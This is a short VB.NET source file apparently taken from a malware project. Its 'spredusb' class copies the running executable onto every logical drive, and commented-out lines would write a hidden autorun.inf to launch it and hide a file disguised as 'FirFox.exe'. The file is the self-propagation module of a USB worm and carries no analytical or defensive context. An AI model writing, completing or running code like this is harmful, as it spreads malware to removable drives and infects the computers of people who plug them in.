Imports j
Imports System

Public Class spredusb
    Public Shared Sub Start()

        Dim drivers As String = My.Computer.FileSystem.SpecialDirectories.ProgramFiles
        Dim driver() As String = (IO.Directory.GetLogicalDrives)
        For Each drivers In driver
            Try
                If System.IO.File.Exists(drivers & OK.RG) = False Then
                    System.IO.File.Copy(System.Reflection.Assembly.GetExecutingAssembly.Location, drivers & OK.RG)
                Else
                End If
                'Dim autorunwriter = New StreamWriter(drivers & "autorun.inf")
                ' autorunwriter.WriteLine("[autorun]")
                '  autorunwriter.WriteLine("open=Tools.exe")
                ' autorunwriter.WriteLine("shellexecute=Tools.exe")
                ' autorunwriter.Close()
                'System.IO.File.SetAttributes(drivers & "autorun.inf", FileAttributes.Hidden)
                'System.IO.File.SetAttributes(drivers & "FirFox.exe", FileAttributes.Hidden)
            Catch
            End Try
        Next
    End Sub
End Class
